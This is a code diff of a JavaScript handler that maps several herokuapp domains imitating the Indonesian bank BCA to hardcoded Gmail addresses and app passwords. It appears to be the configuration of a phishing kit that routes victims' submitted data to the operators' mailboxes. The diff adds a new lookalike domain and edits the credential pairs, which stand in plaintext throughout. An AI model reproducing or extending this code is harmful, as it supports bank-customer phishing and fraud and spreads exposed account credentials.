@@ -7,6 +7,12 @@ export default function handler(req, res) {
     let email = '';
     let pass = '';
     
+     if (url == 'pilihan-tarif-baru-bca.herokuapp.com'){
+
+       email = 'jgo362928@gmail.com'
+       pass = 'aveilrpipnjdqepd'
+    }else
+    
      if (url == 'pilihan-tarif-bca.herokuapp.com'){
 
        email = 'linkbca97@gmail.com'
@@ -21,8 +27,8 @@ export default function handler(req, res) {
     
      if (url == 'pilih-tarif-terbaru-bca.herokuapp.com'){
 
-        email = 'jakad2748@gmail.com'
-        pass = 'ncvhmetlctiocc'
+        email = 'jakad278@gmail.com'
+        pass = 'ncvhmetlcc'
 
     } else {
         email = 'jakad2748@gmail.com'
